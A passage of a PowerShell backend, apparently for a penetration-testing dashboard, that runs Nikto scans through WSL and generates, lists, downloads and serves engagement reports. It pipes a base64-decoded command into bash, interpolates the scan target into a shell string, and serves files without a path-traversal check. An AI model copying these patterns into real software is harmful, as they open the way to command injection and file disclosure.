                    $NiktoCmd = "nikto -h http://$Target`:$Port -Tuning 1 2>&1 | head -n 15"
                    $b64Nikto = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($NiktoCmd))
                    $NiktoOut = & wsl.exe bash -c "echo $b64Nikto | base64 -d | bash"
                    $HostFindings.outputs += @{ tool="Nikto Web Scan"; output=$NiktoOut }
                }

                $Results += $HostFindings
            }

            Send-Json @{ success = $true; results = $Results }
        } catch {
            Send-Json @{ success = $false; error = $_.Exception.Message }
        }
        continue
    }

    # ==========================================
    # 3. REPORT GENERATOR (PDF & HTML Engine)
    # ==========================================
    if ($urlPath -eq "/api/report/generate" -and $req.HttpMethod -eq "POST") {
        try {
            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $engagement = if ($jsonBody.engagement) { $jsonBody.engagement } else { "ENG-2026-001" }
            $client = if ($jsonBody.client) { $jsonBody.client } else { "Target Corp" }
            $tester = if ($jsonBody.tester) { $jsonBody.tester } else { "redteam" }

            $data = Get-CloudOSReportData -EngagementId $engagement -ClientName $client -TesterName $tester

            $safeClient  = ($client -replace '[^A-Za-z0-9\-]','_')
            $safeEng     = ($engagement -replace '[^A-Za-z0-9\-]','_')
            $stamp       = Get-Date -Format "yyyyMMdd_HHmmss"
            $reportBase  = "report_${safeClient}_${safeEng}_$stamp"
            $winDir      = Join-Path $PSScriptRoot "reports"
            New-Item -ItemType Directory -Force -Path $winDir | Out-Null
            $htmlWinPath = Join-Path $winDir "$reportBase.html"
            $pdfWinPath  = Join-Path $winDir "$reportBase.pdf"

            $html = New-ReportHtml -Data $data
            [System.IO.File]::WriteAllText($htmlWinPath, $html, [System.Text.UTF8Encoding]::new($false))

            $wslHtml = (wsl.exe wslpath -u $htmlWinPath).Trim()
            $wslPdf  = (wsl.exe wslpath -u $pdfWinPath).Trim()

            $cmd = "wkhtmltopdf --enable-local-file-access --quiet --print-media-type --page-size A4 --margin-top 12mm --margin-bottom 12mm `"$wslHtml`" `"$wslPdf`" 2>&1"
            $res = Invoke-WslBash -Command $cmd -TimeoutSec 90

            Send-Json @{
                ok     = (Test-Path $pdfWinPath)
                html   = $reportBase + ".html"
                pdf    = $reportBase + ".pdf"
                stderr = $res.Stderr
            }
        } catch {
            Send-Json @{ ok = $false; error = $_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/report/list") {
        try {
            $dir = Join-Path $PSScriptRoot "reports"
            $files = if (Test-Path $dir) {
                Get-ChildItem $dir -File | Sort-Object LastWriteTime -Descending |
                    Select-Object name, length, lastWriteTime
            } else { @() }
            Send-Json @{ reports = $files }
        } catch {
            Send-Json @{ reports = @() }
        }
        continue
    }

    if ($urlPath -eq "/api/report/download") {
        try {
            $name = $req.QueryString["file"]
            if ($name -notmatch '^[A-Za-z0-9_\-]+\.(html|pdf)$') {
                Send-Json @{ ok = $false; error = "Invalid filename" }
                continue
            }
            $full = Join-Path $PSScriptRoot "reports\$name"
            if (-not (Test-Path $full)) {
                Send-Json @{ ok = $false; error = "File not found" }
                continue
            }
            $mime = if ($name -like "*.pdf") { "application/pdf" } else { "text/html; charset=utf-8" }
            $bytes = [System.IO.File]::ReadAllBytes($full)
            $res.ContentType = $mime
            $res.ContentLength64 = $bytes.Length
            $res.AddHeader("Content-Disposition", "attachment; filename=`"$name`"")
            $res.OutputStream.Write($bytes, 0, $bytes.Length)
            $res.OutputStream.Close()
        } catch {
            Send-Json @{ ok = $false; error = $_.Exception.Message }
        }
        continue
    }

    if ($urlPath.StartsWith("/api/")) {
        Send-Json @() -IsArray
        continue
    }

    $cleanPath = $urlPath.TrimStart('/')
    if ([string]::IsNullOrWhiteSpace($cleanPath)) {
        $targetFile = Join-Path $distDir "index.html"
    } else {
        $cleanPath = $cleanPath.Replace('/', '\')
        $targetFile = Join-Path $distDir $cleanPath
    }

    if (-not (Test-Path -Path $targetFile -PathType Leaf)) {
        $targetFile = Join-Path $distDir "index.html"
    }

    if (Test-Path -Path $targetFile -PathType Leaf) {
        $ext = [System.IO.Path]::GetExtension($targetFile).ToLower()
        $contentType = switch ($ext) {
            ".html" { "text/html; charset=utf-8" }
            ".css"  { "text/css; charset=utf-8" }
            ".js"   { "application/javascript; charset=utf-8" }
            ".json" { "application/json; charset=utf-8" }
            ".png"  { "image/png" }
            ".jpg"  { "image/jpeg" }
            ".svg"  { "image/svg+xml" }
            ".ico"  { "image/x-icon" }
            default { "application/octet-stream" }
        }

        $res.ContentType = $contentType
        $contentBytes = [System.IO.File]::ReadAllBytes($targetFile)
        $res.ContentLength64 = $contentBytes.Length
        $res.OutputStream.Write($contentBytes, 0, $contentBytes.Length)
        $res.OutputStream.Close()
    } else {
        $res.StatusCode = 404
        $res.OutputStream.Close()
    }
}
